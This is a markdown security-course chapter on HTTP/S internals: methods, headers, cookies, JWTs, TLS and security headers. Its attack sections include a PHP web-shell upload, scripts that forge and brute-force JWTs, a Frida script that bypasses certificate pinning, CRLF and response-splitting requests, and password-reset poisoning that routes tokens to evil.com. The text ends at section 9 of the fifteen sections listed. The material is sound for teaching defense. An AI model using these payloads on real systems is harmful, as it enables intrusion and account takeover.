# HTTP/S Protocol Internals: The Backbone of the Web

---
title: "HTTP/S Protocol Internals"
parent: "[[02_Networking]]"
tags:
  - network
  - http
  - tls
  - web
  - protocol
  - deep-dive
created: 2026-01-23
updated: 2026-01-24
---

> **Executive Summary**: The vast majority of the modern attack surface is accessed via HTTP. Whether you are exploiting a REST API, attacking a web application, or bypassing a WAF, you are manipulating the HyperText Transfer Protocol. This chapter moves beyond "clicking links" to understanding the raw text protocol, the state management (Cookies/Tokens), and the cryptography (TLS) that secures it.

---

## Table of Contents
1. [Learning Objectives](#1-learning-objectives)
2. [HTTP: The Protocol Anatomy](#2-http-the-protocol-anatomy)
3. [HTTP Version Evolution: 1.0, 1.1, 2.0, 3.0](#3-http-version-evolution-10-11-20-30)
4. [Methods, Headers, and Codes](#4-methods-headers-and-codes)
5. [State Management: Cookies vs. Tokens](#5-state-management-cookies-vs-tokens)
6. [HTTPS: The TLS Handshake](#6-https-the-tls-handshake)
7. [Certificate Validation & Pinning](#7-certificate-validation--pinning)
8. [HTTP Security Attacks](#8-http-security-attacks)
9. [Security Headers & Defense](#9-security-headers--defense)
10. [Web Cache Poisoning](#10-web-cache-poisoning)
11. [HTTP Request Smuggling](#11-http-request-smuggling)
12. [Session Hijacking & Fixation](#12-session-hijacking--fixation)
13. [SSL/TLS Downgrade Attacks](#13-ssltls-downgrade-attacks)
14. [Practical Lab: Raw Interaction & Interception](#14-practical-lab-raw-interaction--interception)
15. [Critical Analysis & Checkpoints](#15-critical-analysis--checkpoints)

---

## 1. Learning Objectives

By the end of this chapter, you will be able to:

- **Craft Raw Requests**: Manually build GET and POST requests using Netcat and OpenSSL.
- **Analyze Headers**: Identify security misconfigurations like missing HSTS or loose CORS policies.
- **Decrypt TLS**: Explain how Proxy tools (Burp Suite) intercept HTTPS using custom CA certificates.
- **Differentiate Auth**: Compare Session Cookies (Stateful) vs JWTs (Stateless).
- **Debug Errors**: Interpret HTTP Status codes to identify WAF blocks (403 vs 406) or Server Errors (500).
- **Execute Attacks**: Perform HTTP Header Injection, Request Smuggling, and SSL Stripping.
- **Implement Defenses**: Configure security headers, HSTS, CSP, and CORS properly.
- **Analyze Traffic**: Use Wireshark to dissect HTTP/HTTPS flows and identify anomalies.

---

## 2. HTTP: The Protocol Anatomy

**BEGINNER EXPLANATION**: Think of HTTP as a conversation between you (the client/browser) and a website (the server). You ask a question (request), and the server gives you an answer (response). This conversation follows a strict format, like filling out a form with specific fields.

HTTP is a **text-based, stateless, request-response protocol**. Every interaction is independent; the server doesn't "remember" previous requests unless you implement state management.

### 2.1 The Request Structure

```http
POST /api/login HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Content-Type: application/json
Content-Length: 42
Cookie: session_id=abc12345
Authorization: Bearer eyJhbGc...

{"username":"admin","password":"P@ssw0rd"}
```

**Key Components**:
- **Request Line**: `METHOD PATH PROTOCOL_VERSION`
  - METHOD: What action to perform (GET, POST, PUT, DELETE, etc.)
  - PATH: The resource being requested (/api/login)
  - PROTOCOL_VERSION: HTTP/1.1, HTTP/2, etc.
  
- **Headers**: Metadata about the request
  - `Host`: The target server (required in HTTP/1.1 for virtual hosting)
  - `User-Agent`: Browser/client identification
  - `Content-Type`: Format of the data being sent
  - `Content-Length`: Size of the request body in bytes
  - `Cookie`: State/session information
  - `Authorization`: Authentication credentials
  
- **Empty Line**: CRLF (`\r\n`) separating headers from body
  
- **Body**: The actual data being transmitted (JSON, XML, Form data, etc.)

### 2.2 The Response Structure

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Sat, 24 Jan 2026 12:00:00 GMT
Content-Type: application/json
Content-Length: 58
Set-Cookie: token=xyz987; HttpOnly; Secure; SameSite=Strict
Strict-Transport-Security: max-age=31536000
X-Frame-Options: DENY

{"status":"success","role":"admin","token":"xyz987"}
```

**Key Components**:
- **Status Line**: `PROTOCOL_VERSION STATUS_CODE REASON_PHRASE`
  - 200 OK means success
  - 404 means not found
  - 500 means server error
  
- **Response Headers**: Server information and instructions
  - `Server`: Web server software version
  - `Set-Cookie`: Sets cookies in the client browser
  - Security headers (HSTS, X-Frame-Options, CSP, etc.)
  
- **Body**: The requested data (HTML page, JSON response, file, etc.)

### 2.3 ASCII Diagram: HTTP Transaction Flow

```
┌─────────┐                                      ┌─────────┐
│ Client  │                                      │ Server  │
│(Browser)│                                      │ (nginx) │
└────┬────┘                                      └────┬────┘
     │                                                │
     │  1. TCP SYN                                   │
     ├──────────────────────────────────────────────>│
     │                                                │
     │  2. TCP SYN-ACK                               │
     │<──────────────────────────────────────────────┤
     │                                                │
     │  3. TCP ACK (Connection established)          │
     ├──────────────────────────────────────────────>│
     │                                                │
     │  4. HTTP Request                              │
     │  GET /index.html HTTP/1.1                     │
     │  Host: example.com                            │
     ├──────────────────────────────────────────────>│
     │                                                │
     │                           Server processes    │
     │                           request, generates  │
     │                           response            │
     │                                                │
     │  5. HTTP Response                             │
     │  HTTP/1.1 200 OK                              │
     │  Content-Type: text/html                      │
     │  <html>...</html>                             │
     │<──────────────────────────────────────────────┤
     │                                                │
     │  6. TCP FIN (Connection close)                │
     ├──────────────────────────────────────────────>│
     │                                                │
```

**BEGINNER EXPLANATION**: The diagram shows that HTTP is built on top of TCP. Before any HTTP data flows, a TCP connection must be established (the three-way handshake). Only then can HTTP requests and responses be exchanged.

---

## 3. HTTP Version Evolution: 1.0, 1.1, 2.0, 3.0

### 3.1 HTTP/1.0 (1996)

**Characteristics**:
- One request per TCP connection
- Connection closes after each response
- No persistent connections
- Simple and inefficient

**Example**:
```http
GET /index.html HTTP/1.0
Host: example.com

[Server sends response and closes connection]
```

**Problem**: Opening a new TCP connection for every resource (images, CSS, JS) is very slow due to TCP handshake overhead.

### 3.2 HTTP/1.1 (1997 - Still widely used)

**Improvements**:
- **Persistent Connections**: Reuse the same TCP connection for multiple requests
- **Pipelining**: Send multiple requests without waiting for responses (rarely used in practice)
- **Chunked Transfer Encoding**: Stream data without knowing the size beforehand
- **Host Header**: Required (enables virtual hosting)
- **Additional Methods**: PUT, DELETE, OPTIONS, TRACE

**Example**:
```http
GET /index.html HTTP/1.1
Host: example.com
Connection: keep-alive

[Response]

GET /style.css HTTP/1.1
Host: example.com
Connection: keep-alive

[Response - same TCP connection]
```

**BEGINNER EXPLANATION**: HTTP/1.1 is like keeping a phone line open instead of hanging up and redialing for every sentence. You can have a full conversation on one call.

### 3.3 HTTP/2 (2015)

**Revolutionary Changes**:
- **Binary Protocol**: No longer text-based, uses binary frames
- **Multiplexing**: Multiple requests/responses in parallel over a single TCP connection
- **Stream Prioritization**: Important resources load first
- **Header Compression**: HPACK algorithm reduces header overhead
- **Server Push**: Server can send resources proactively

**Binary Frame Structure**:
```
+-----------------------------------------------+
|                 Length (24)                   |
+---------------+---------------+---------------+
|   Type (8)    |   Flags (8)   |
+-+-------------+---------------+-------------------------------+
|R|                 Stream Identifier (31)                      |
+=+=============================================================+
|                   Frame Payload (0...)                      ...
+---------------------------------------------------------------+
```

**Attack Surface**: HTTP/2 introduced new attack vectors like:
- Request Smuggling via stream manipulation
- Resource exhaustion through stream flooding
- HPACK bomb (compression bombs)

### 3.4 HTTP/3 (2022)

**Major Change**: Replaces TCP with **QUIC** (UDP-based protocol)

**Why UDP?**:
- Eliminates Head-of-Line Blocking (TCP problem where one lost packet blocks all streams)
- Faster connection establishment (0-RTT)
- Better performance on lossy networks (mobile)
- Built-in encryption (QUIC includes TLS 1.3)

**BEGINNER EXPLANATION**: TCP is like a convoy of trucks - if one truck breaks down, all trucks behind it must wait. QUIC (HTTP/3) is like individual motorcycles that can pass around obstacles independently.

**Comparison Table**:
```
┌──────────────┬──────────┬──────────┬──────────┬──────────┐
│  Feature     │ HTTP/1.0 │ HTTP/1.1 │ HTTP/2   │ HTTP/3   │
├──────────────┼──────────┼──────────┼──────────┼──────────┤
│ Transport    │ TCP      │ TCP      │ TCP      │ QUIC/UDP │
│ Format       │ Text     │ Text     │ Binary   │ Binary   │
│ Persistent   │ No       │ Yes      │ Yes      │ Yes      │
│ Multiplexing │ No       │ No       │ Yes      │ Yes      │
│ Encryption   │ Optional │ Optional │ Optional │ Mandatory│
│ Header Comp. │ No       │ No       │ HPACK    │ QPACK    │
└──────────────┴──────────┴──────────┴──────────┴──────────┘
```

---

## 4. Methods, Headers, and Codes

### 4.1 HTTP Methods Deep Dive

**BEGINNER EXPLANATION**: HTTP methods are like verbs in a sentence. They tell the server what action you want to perform: read (GET), create (POST), update (PUT), or delete (DELETE).

#### GET - Retrieve Data
```http
GET /api/users/123 HTTP/1.1
Host: api.example.com
```

**Characteristics**:
- Idempotent (calling it multiple times has the same effect)
- Parameters in URL query string
- **Security Issue**: Credentials in URL are logged in server logs, browser history, proxy logs
- Should not modify server state

**Vulnerable Example**:
```http
GET /api/delete?id=123&admin=true HTTP/1.1
```
**Problem**: DELETE operation via GET is bad design. Can be triggered by image tags: `<img src="http://api.example.com/api/delete?id=123">`

#### POST - Submit Data
```http
POST /api/users HTTP/1.1
Host: api.example.com
Content-Type: application/json
Content-Length: 54

{"username":"hacker","password":"P@ss","role":"admin"}
```

**Characteristics**:
- Not idempotent (creates new resources each time)
- Data in request body (not logged in URL)
- Can send large amounts of data
- **Attack Vector**: Parameter pollution, JSON injection, XML bomb

#### PUT - Upload/Replace Resource
```http
PUT /files/shell.php HTTP/1.1
Host: vulnerable.com
Content-Type: application/x-php
Content-Length: 25

<?php system($_GET['c']);?>
```

**Attack**: If PUT is allowed without authentication, attackers can upload web shells.

#### DELETE - Remove Resource
```http
DELETE /api/users/123 HTTP/1.1
Host: api.example.com
Authorization: Bearer token123
```

**Attack**: IDOR (Insecure Direct Object Reference) - change 123 to 124 to delete other users.

#### OPTIONS - Discover Allowed Methods
```http
OPTIONS /api/users HTTP/1.1
Host: api.example.com

Response:
HTTP/1.1 200 OK
Allow: GET, POST, OPTIONS, DELETE
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Origin: *
```

**Reconnaissance Value**: Reveals available methods and CORS configuration.

#### HEAD - GET Without Body
```http
HEAD /admin/config.php HTTP/1.1
Host: target.com

Response:
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 4589
```

**Reconnaissance Value**: Check if files exist without downloading them.

#### TRACE - Echo Request (Debugging)
```http
TRACE / HTTP/1.1
Host: target.com

Response:
HTTP/1.1 200 OK
Content-Type: message/http

TRACE / HTTP/1.1
Host: target.com
Cookie: session=secret123
```

**Attack**: Cross-Site Tracing (XST) - bypasses HttpOnly cookie protection by reflecting cookies in the response.

**Defense**: Disable TRACE in web server configuration.

#### CONNECT - Establish Tunnel
```http
CONNECT proxy.example.com:443 HTTP/1.1
Host: proxy.example.com
```

Used for SSL tunneling through proxies. Can be abused to bypass firewall restrictions.

### 4.2 Critical HTTP Headers

#### Host Header
```http
GET /reset-password HTTP/1.1
Host: evil.com
```

**Attack**: Host Header Injection for password reset poisoning.

**How it Works**:
1. Attacker requests password reset for victim@target.com
2. Manipulates Host header to `Host: evil.com`
3. Server generates reset link: `http://evil.com/reset?token=abc123`
4. Victim clicks link, attacker steals token

**Defense**: Validate Host header against whitelist.

#### X-Forwarded-For (XFF)
```http
GET /admin HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
```

**Attack**: IP ACL Bypass - if the application trusts XFF without validation, attacker can claim to be localhost.

**Chain of Proxies**:
```http
X-Forwarded-For: client_ip, proxy1_ip, proxy2_ip
```

**Defense**: Only trust XFF if the request comes from known proxy IPs.

#### Content-Type
```http
POST /upload HTTP/1.1
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
```

**Attack**: Content-Type mismatch - upload PHP code with image MIME type, then access it directly if server doesn't validate.

#### User-Agent
```http
GET / HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1)
```

**Attack**: User-Agent spoofing to bypass rate limiting or access hidden content (Google Cache pages, mobile-only pages).

#### Referer
```http
GET /api/data HTTP/1.1
Referer: https://trusted-site.com/
```

**Attack**: Referer spoofing to bypass CSRF protection that only checks Referer header.
**Privacy Issue**: Leaks sensitive data in URL to third-party sites.

#### Authorization
```http
GET /api/secret HTTP/1.1
Authorization: Basic YWRtaW46cGFzc3dvcmQ=
```

**Decoded**: `admin:password` (Base64 is encoding, not encryption!)

**Types**:
- `Basic`: Base64-encoded username:password (MUST use HTTPS)
- `Bearer`: Token-based (JWT, OAuth2)
- `Digest`: Hash-based challenge-response (obsolete)
- `NTLM`: Windows authentication

### 4.3 HTTP Status Codes Masterclass

#### 1xx - Informational
- **100 Continue**: Server received request headers, client should send body
- **101 Switching Protocols**: Server switching to WebSocket

#### 2xx - Success
- **200 OK**: Standard success
- **201 Created**: New resource created (POST success)
- **204 No Content**: Success but no response body

#### 3xx - Redirection
- **301 Moved Permanently**: Browser caches this redirect
- **302 Found**: Temporary redirect (can be exploited for open redirects)
- **304 Not Modified**: Use cached version (saves bandwidth)
- **307 Temporary Redirect**: Like 302 but preserves HTTP method

**Open Redirect Example**:
```http
GET /redirect?url=http://evil.com HTTP/1.1

Response:
HTTP/1.1 302 Found
Location: http://evil.com
```

#### 4xx - Client Errors
- **400 Bad Request**: Malformed syntax
- **401 Unauthorized**: Authentication required
- **403 Forbidden**: Authenticated but not authorized (WAF block)
- **404 Not Found**: Resource doesn't exist (or hidden)
- **405 Method Not Allowed**: Wrong HTTP method
- **406 Not Acceptable**: Content negotiation failure (often WAF)
- **429 Too Many Requests**: Rate limiting

#### 5xx - Server Errors
- **500 Internal Server Error**: Application crashed (injection point?)
- **502 Bad Gateway**: Upstream server error
- **503 Service Unavailable**: Server overloaded or down

**Exploitation**: 500 errors often reveal stack traces with sensitive info.

---

## 5. State Management: Cookies vs. Tokens

**BEGINNER EXPLANATION**: HTTP doesn't remember you between requests. Imagine going to a store where the clerk forgets you every 5 seconds. Cookies and tokens are like membership cards that remind the server who you are.

### 5.1 Session Cookies (Stateful)

**Flow**:
```
1. Client → Server: POST /login (username, password)
2. Server: Validates credentials
3. Server: Creates session in database:
   Session ID: abc123
   User: admin
   Expires: 2026-01-25
4. Server → Client: Set-Cookie: sessionid=abc123; HttpOnly; Secure
5. Client → Server: GET /dashboard
                    Cookie: sessionid=abc123
6. Server: Looks up abc123 in database, finds user=admin
7. Server → Client: Dashboard data for admin
```

**Storage**: Server-side (database, Redis, memcached)

**Advantages**:
- Server has full control (can invalidate immediately)
- Can track session data (last login, IP, device)

**Disadvantages**:
- Requires server-side storage (doesn't scale horizontally well)
- Database lookup on every request

**Attack**: Session Fixation, Session Hijacking, CSRF

### 5.2 JSON Web Tokens (Stateless)

**Structure of JWT**:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE2NzQ1Nzg0MDB9.Xl6T9K3Rfz7vN8aQ2GhE5rF9cF8sT2nK1pQ3yR9xZ8s

[Header].[Payload].[Signature]
```

**Decoded Header**:
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Decoded Payload**:
```json
{
  "user": "admin",
  "role": "admin",
  "exp": 1674578400
}
```

**Signature**: HMAC-SHA256(base64(header) + "." + base64(payload), secret_key)

**Flow**:
```
1. Client → Server: POST /login (username, password)
2. Server: Validates credentials
3. Server: Creates JWT with payload {user: "admin"}
4. Server: Signs JWT with secret key
5. Server → Client: {"token": "eyJhbGc..."}
6. Client stores token (localStorage or memory)
7. Client → Server: GET /dashboard
                    Authorization: Bearer eyJhbGc...
8. Server: Verifies signature, trusts payload
9. Server → Client: Dashboard data
```

**Storage**: Client-side (no server storage needed)

**Advantages**:
- Stateless (scales horizontally)
- No database lookup
- Can be used across microservices

**Disadvantages**:
- Cannot invalidate before expiration
- Token theft is permanent until expiration
- Payload size grows with data

### 5.3 Cookie Attributes & Security

```http
Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Strict; Path=/; Domain=.example.com; Max-Age=3600
```

**Attribute Breakdown**:

| Attribute | Purpose | Attack Mitigated |
|-----------|---------|------------------|
| `HttpOnly` | JavaScript cannot access | XSS cookie theft |
| `Secure` | Only sent over HTTPS | Man-in-the-Middle |
| `SameSite=Strict` | Not sent on cross-site requests | CSRF |
| `SameSite=Lax` | Sent on top-level navigation (clicking link) | Partial CSRF protection |
| `Path=/admin` | Only sent for /admin paths | Reduces exposure |
| `Domain=.example.com` | Sent to all subdomains | Subdomain takeover risk |
| `Max-Age=3600` | Expires in 1 hour | Session fixation |

**BEGINNER EXPLANATION**:
- **HttpOnly**: Cookie is invisible to JavaScript, like a sealed envelope.
- **Secure**: Cookie only travels on encrypted roads (HTTPS).
- **SameSite=Strict**: Cookie stays home when you visit other websites.

### 5.4 JWT Vulnerabilities

#### Attack 1: None Algorithm
```json
{
  "alg": "none",
  "typ": "JWT"
}
{
  "user": "admin",
  "role": "admin"
}
```

**Exploit**: If server doesn't enforce algorithm verification, attacker can set `alg: none` and remove signature.

**Exploit Code**:
```python
import base64
import json

header = {"alg": "none", "typ": "JWT"}
payload = {"user": "admin", "role": "admin"}

encoded_header = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
encoded_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')

# No signature
forged_jwt = f"{encoded_header}.{encoded_payload}."
print(forged_jwt)
```

#### Attack 2: Weak Secret Key
**Brute Force JWT Secret**:
```python
import hmac
import hashlib
import base64

jwt_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.Xl6T9K3Rfz7vN8"
header_payload, signature = jwt_token.rsplit('.', 1)

wordlist = ["secret", "password", "123456", "key", "jwt_secret"]

for secret in wordlist:
    test_sig = hmac.new(secret.encode(), header_payload.encode(), hashlib.sha256).digest()
    test_sig_b64 = base64.urlsafe_b64encode(test_sig).decode().rstrip('=')
    
    if test_sig_b64 == signature:
        print(f"[+] Secret found: {secret}")
        break
```

Tool: **jwt_tool** - automates JWT attacks

#### Attack 3: Algorithm Confusion (RS256 to HS256)
- Server uses RS256 (asymmetric - public/private key)
- Attacker changes header to HS256 (symmetric)
- Server verifies signature using public key as HMAC secret
- Attacker signs token with public key (which they know)

**Defense**:
- Enforce algorithm whitelist
- Never use weak secrets
- Rotate keys regularly
- Use short expiration times

---

## 6. HTTPS: The TLS Handshake

**BEGINNER EXPLANATION**: HTTP is like sending a postcard - anyone can read it. HTTPS is like sending a locked safe - only the recipient has the key. TLS (Transport Layer Security) provides that lock.

### 6.1 TLS 1.2 Handshake (Detailed)

```
Client                                Server
  |                                      |
  |  1. ClientHello                     |
  |  - TLS version: 1.2                 |
  |  - Cipher suites supported          |
  |  - Random bytes (Client Random)     |
  |  - SNI: example.com                 |
  |------------------------------------->|
  |                                      |
  |  2. ServerHello                     |
  |  - Chosen TLS version: 1.2          |
  |  - Chosen cipher suite              |
  |  - Random bytes (Server Random)     |
  |<-------------------------------------|
  |                                      |
  |  3. Certificate                     |
  |  - Server's X.509 certificate       |
  |  - Contains public key              |
  |<-------------------------------------|
  |                                      |
  |  4. ServerHelloDone                 |
  |<-------------------------------------|
  |                                      |
  | Client validates certificate:        |
  | - Is it from trusted CA?             |
  | - Is it expired?                     |
  | - Does CN match domain?              |
  |                                      |
  |  5. ClientKeyExchange               |
  |  - Pre-master secret (encrypted     |
  |    with server's public key)        |
  |------------------------------------->|
  |                                      |
  | Both sides derive session key from:  |
  | - Client Random                      |
  | - Server Random                      |
  | - Pre-master secret                  |
  |                                      |
  |  6. ChangeCipherSpec                |
  |  - Switch to encrypted communication|
  |------------------------------------->|
  |                                      |
  |  7. Finished (encrypted)            |
  |  - Verify handshake integrity       |
  |------------------------------------->|
  |                                      |
  |  8. ChangeCipherSpec                |
  |<-------------------------------------|
  |                                      |
  |  9. Finished (encrypted)            |
  |<-------------------------------------|
  |                                      |
  |  10. Application Data (encrypted)   |
  |  - HTTP requests/responses          |
  |<------------------------------------>|
```

**Key Points**:
- **Client Random + Server Random**: Prevents replay attacks
- **Pre-Master Secret**: Encrypted with server's public key (only server can decrypt)
- **Session Key**: Derived from all three random values (symmetric encryption)
- **Cipher Suite Example**: `TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384`
  - Key Exchange: ECDHE (Elliptic Curve Diffie-Hellman Ephemeral)
  - Authentication: RSA
  - Encryption: AES-256-GCM
  - MAC: SHA384

### 6.2 TLS 1.3 Improvements

**Faster Handshake** (1-RTT instead of 2-RTT):
```
Client                                Server
  |                                      |
  |  1. ClientHello                     |
  |  - Supported versions               |
  |  - Key share (ECDHE)                |
  |------------------------------------->|
  |                                      |
  |  2. ServerHello + Certificate       |
  |     + CertificateVerify + Finished  |
  |  - Key share                        |
  |<-------------------------------------|
  |                                      |
  |  3. Finished                        |
  |------------------------------------->|
  |                                      |
  |  4. Application Data                |
  |<------------------------------------>|
```

**Security Improvements**:
- Removed weak cipher suites (RC4, 3DES, MD5, SHA1)
- Forward secrecy mandatory (ECDHE only)
- Encrypted handshake (protects certificate)
- 0-RTT mode for resumed connections (with replay risk)

### 6.3 Certificate Validation Process

**X.509 Certificate Structure**:
```
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 04:00:00:00:00:01:44:4e:f0:3e:20
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: CN=Let's Encrypt Authority X3
        Validity
            Not Before: Jan 20 00:00:00 2026 GMT
            Not After : Apr 20 23:59:59 2026 GMT
        Subject: CN=example.com
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
        X509v3 extensions:
            X509v3 Subject Alternative Name:
                DNS:example.com, DNS:*.example.com
            X509v3 Key Usage: critical
                Digital Signature, Key Encipherment
```

**Validation Steps**:
1. **Chain of Trust**: Certificate signed by Let's Encrypt → Let's Encrypt signed by Root CA → Root CA in browser's trust store
2. **Expiration**: Check current date is between Not Before and Not After
3. **Hostname Verification**: Certificate CN or SAN matches requested domain
4. **Revocation**: Check CRL (Certificate Revocation List) or OCSP (Online Certificate Status Protocol)
5. **Signature Verification**: Verify CA's digital signature

**Common Errors**:
- `ERR_CERT_AUTHORITY_INVALID`: Certificate not signed by trusted CA
- `ERR_CERT_DATE_INVALID`: Certificate expired or not yet valid
- `ERR_CERT_COMMON_NAME_INVALID`: Domain mismatch
- `ERR_CERT_REVOKED`: Certificate has been revoked

### 6.4 Man-in-the-Middle with Burp Suite

**How Burp Intercepts HTTPS**:
```
Browser                    Burp Suite                Server
  |                            |                        |
  |  1. Connect to Burp        |                        |
  |--------------------------->|                        |
  |                            |                        |
  |  2. TLS Handshake          |                        |
  |  <--- Burp's Certificate --|                        |
  |  (signed by Burp CA)       |                        |
  |                            |                        |
  |  3. Encrypted with         |                        |
  |     Burp's key             |                        |
  |--------------------------->|                        |
  |                            | Burp decrypts          |
  |                            |                        |
  |                            |  4. New TLS to server  |
  |                            |----------------------->|
  |                            |  <--- Real certificate |
  |                            |                        |
  |                            |  5. Forward request    |
  |                            |----------------------->|
  |                            |                        |
  |                            |  6. Response           |
  |                            |<-----------------------|
  |  7. Re-encrypt with Burp's |                        |
  |     certificate            |                        |
  |<---------------------------|                        |
```

**Requirements**:
1. Install Burp's CA certificate in browser's trust store
2. Configure browser to use Burp as proxy
3. Burp generates certificates on-the-fly for each domain

**Bypassing Certificate Pinning** (Mobile Apps):
- Apps hardcode expected certificate/public key hash
- Solution: Use Frida to hook SSL verification functions

```javascript
// Frida script to bypass certificate pinning
Java.perform(function() {
    var CertificatePinner = Java.use('okhttp3.CertificatePinner');
    CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function() {
        console.log('[+] Certificate pinning bypassed');
    };
});
```

---

## 7. Certificate Validation & Pinning

### 7.1 Public Key Pinning (HPKP - Deprecated)

**Concept**: Browser remembers the hash of the server's public key. If it changes (MITM), connection is blocked.

```http
Public-Key-Pins: 
    pin-sha256="base64=="; 
    pin-sha256="backup_base64==";
    max-age=5184000;
    includeSubDomains
```

**Why Deprecated**:
- Misconfiguration can lock users out permanently
- Operational burden (key rotation)
- Replaced by Certificate Transparency and Expect-CT

### 7.2 Certificate Transparency

**Problem**: CA can be compromised and issue fake certificates.

**Solution**: All certificates must be logged in public CT logs.

```http
Expect-CT: max-age=86400, enforce, report-uri="https://example.com/ct-report"
```

**How It Works**:
1. CA issues certificate and submits to CT log
2. CT log returns Signed Certificate Timestamp (SCT)
3. Server presents SCT during TLS handshake
4. Browser verifies SCT and checks CT log

### 7.3 OCSP Stapling

**Problem**: Client queries OCSP server to check if certificate is revoked (privacy leak, performance hit).

**Solution**: Server fetches OCSP response and "staples" it to the certificate during handshake.

**Benefits**:
- Faster (no client-side OCSP query)
- Privacy (OCSP server doesn't see client IP)
- Reliability (server caches OCSP response)

---

## 8. HTTP Security Attacks

### 8.1 HTTP Header Injection

**Vulnerability**: Application includes user input in HTTP headers without sanitization.

**Attack Vector**: CRLF injection (`\r\n`) to inject headers or HTTP response.

**Example - Session Fixation**:
```python
# Vulnerable code (PHP)
header("Location: " + $_GET['url']);
```

**Exploit**:
```http
GET /?url=http://example.com%0d%0aSet-Cookie:%20sessionid=attacker_session HTTP/1.1
Host: vulnerable.com

Response:
HTTP/1.1 302 Found
Location: http://example.com
Set-Cookie: sessionid=attacker_session
```

**Result**: Victim gets attacker's session ID, logs in, attacker hijacks session.

**Example - HTTP Response Splitting**:
```http
GET /?name=hacker%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Length:%2019%0d%0a%0d%0a<script>alert(1)</script> HTTP/1.1
```

**Result**: Injected HTTP response that can deliver XSS payload.

**Defense**:
- Validate and sanitize all input
- Remove CRLF characters (`\r`, `\n`)
- Use framework functions that auto-encode

### 8.2 Host Header Attacks

#### Attack 1: Password Reset Poisoning
```http
POST /reset-password HTTP/1.1
Host: evil.com
Content-Type: application/json

{"email": "victim@example.com"}
```

**Server generates reset link**:
```
http://evil.com/reset?token=abc123xyz
```

**Email sent to victim**:
```
Click here to reset password: http://evil.com/reset?token=abc123xyz
```

**Result**: Victim clicks, attacker captures token on evil.com.

#### Attack 2: Web Cache Poisoning
```http
GET / HTTP/1.1
Host: evil.com
X-Forwarded-Host: evil.com
```

If server uses Host header to generate absolute URLs and response is cached:
```html
<link rel="stylesheet" href="http://evil.com/style.css">
```

**Result**: All users receive poisoned cache with attacker's resources.

#### Defense:
```python
# Whitelist allowed hosts
ALLOWED_HOSTS = ['example.com', 'www.example.com']

if request.headers['Host'] not in ALLOWED_HOSTS:
    return 400
```

### 8.3 Parameter Pollution

**HTTP Parameter Pollution (HPP)**: Send duplicate parameters to bypass filters or overwrite values.

**Example**:
```http
GET /transfer?amount=1&amount=1000 HTTP/1.1
```

**Server Behavior Differs**:
| Platform | Result |
|----------|--------|
| PHP | Last value (`amount=1000`) |
| ASP.NET | Comma-separated (`amount=1,1000`) |
| JSP | Array (`amount=[1,1000]`) |
| Node.js (Express) | Array by default |

**Attack**: If WAF checks first parameter but server uses last:
```http
GET /search?query=safe&query=<script>alert(1)</script>
```

WAF sees `safe`, server uses `<script>...`.

---

## 9. Security Headers & Defense

### 9.1 Strict-Transport-Security (HSTS)

**Purpose**: Force browsers to only use HTTPS.

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

**Parameters**:
- `max-age`: How long to remember (31536000 = 1 year)
- `includeSubDomains`: Apply to all subdomains
- `preload`: Include in browser's HSTS preload list

**Attack Prevented**: SSL Stripping (downgrade HTTPS to HTTP).

**Limitation**: First visit is vulnerable (TOFU - Trust On First Use).

**Solution**: HSTS Preload list (hardcoded in browsers).

### 9.2 Content-Security-Policy (CSP)

**Purpose**: Control what resources can be loaded.

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com; object-src 'none'; base-uri 'none'; frame-ancestors 'none';
```

**Directives**:
- `default-src 'self'`: Only load resources from same origin
- `script-src 'self' https://trusted.com`: Scripts only from self and trusted.com
- `object-src 'none'`: Block all plugins (Flash, Java)
- `base-uri 'none'`: Prevent `<base>` tag injection
- `frame-ancestors 'none'`: Prevent clickjacking (like X-Frame-Options)

**Attack Prevented**: XSS - even if attacker injects `<script src=evil.com>`, CSP blocks it.

**Bypass Techniques**:
- Exploiting `'unsafe-inline'` or `'unsafe-eval'`
- Using whitelisted domains that host JSONP endpoints
- AngularJS template injection (if angular.js is whitelisted)

**CSP Bypass Example**:
```http
Content-Security-Policy: script-src 'self' https://ajax.googleapis.com
```

**Exploit**: JSONP on googleapis:
```html
<script src="https://ajax.googleapis.com/ajax/services/feed/load?v=1.0&callback=alert&q=1"></script>
```

### 9.3 X-Frame-Options

**Purpose**: Prevent clickjacking by controlling if site can be framed.

```http
X-Frame-Options: DENY
```

**Values**:
- `DENY`: Cannot be framed at all
- `SAMEORIGIN`: Can be framed by same origin
- `ALLOW-FROM https://trusted.com`: Can be framed by specific origin (obsolete)

**Modern Alternative**: CSP `frame-ancestors` directive.

### 9.4 X-Content-Type-Options

```http
X-Content-Type-Options: nosniff
```

**Purpose**: Prevent MIME type sniffing.

**Attack Prevented**: Upload `script.jpg` containing JavaScript. Without `nosniff`, IE might execute it as JavaScript.

### 9.5 Referrer-Policy

```http
Referrer-Policy: strict-origin-when-cross-origin
```

**Purpose**: Control what information is sent in Referer header.

**Values**:
- `no-referrer`: Never send Referer
- `strict-origin`: Send origin only (https://example.com)
- `no-referrer-when-downgrade`: Don't send if HTTPS → HTTP

**Privacy Impact**: Prevents leaking sensitive URLs.

### 9.6 Permissions-Policy (formerly Feature-Policy)

```http
Permissions-Policy: geolocation=(), microphone=(), camera=()
```

